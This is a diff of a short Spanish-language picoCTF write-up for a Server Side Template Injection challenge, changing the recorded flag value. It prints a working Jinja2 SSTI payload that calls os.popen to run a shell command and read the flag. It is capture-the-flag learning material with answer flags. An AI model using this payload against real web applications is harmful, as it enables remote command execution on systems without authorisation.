@@ -5,8 +5,7 @@ Entrar a la página dada y aplicar un Server Side Template Injection para obtene
 
 - Entrar al link dado, después al ver que utiliza jinja2, solamente es escribir "{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}", con ello directamente obtenemos la flag
 
-picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
-
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
 
 # Notas adicionales
 - 
